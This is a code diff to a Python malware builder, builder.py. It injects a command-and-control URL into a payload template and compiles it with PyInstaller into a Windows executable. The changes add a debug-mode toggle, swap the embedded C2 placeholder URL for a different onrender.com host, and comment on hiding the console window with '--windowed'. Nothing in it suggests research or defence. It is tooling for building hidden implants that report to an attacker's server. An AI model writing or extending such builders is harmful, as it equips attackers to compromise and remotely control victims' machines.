@@ -1,9 +1,11 @@
+# builder.py (with Debug Mode functionality)
 import os
 import subprocess
 import shutil
 
 def build_payload(c2_url: str, output_dir: str, payload_name: str, debug_mode: bool = False):
     print(f"[*] Starting build for payload '{payload_name}.exe'")
+    print(f"[*] Debug Mode: {'ON' if debug_mode else 'OFF'}")
     
     script_dir = os.path.dirname(os.path.abspath(__file__))
     template_path = os.path.join(script_dir, "payload_template.py")
@@ -20,8 +22,8 @@ def build_payload(c2_url: str, output_dir: str, payload_name: str, debug_mode: b
         with open(template_path, "r") as f:
             content = f.read()
         
-        # This is where we replace the placeholder URL
-        content = content.replace("https://datavault-c2.onrender.com", c2_url)
+        # Replace the placeholder URL in the template
+        content = content.replace("https://tether-c2-communication-line-by-ebowluh.onrender.com", c2_url)
         
         with open(configured_payload_path, "w") as f:
             f.write(content)
@@ -29,6 +31,9 @@ def build_payload(c2_url: str, output_dir: str, payload_name: str, debug_mode: b
         print("[*] Running PyInstaller...")
         pyinstaller_cmd = ['pyinstaller', '--noconfirm', '--onefile', '--distpath', output_dir, '--name', payload_name]
         
+        # ### THIS IS THE KEY CHANGE ###
+        # If debug_mode is FALSE, add the '--windowed' flag to hide the console.
+        # If debug_mode is TRUE, we DON'T add it, so the console will appear.
         if not debug_mode:
             pyinstaller_cmd.append('--windowed')
             
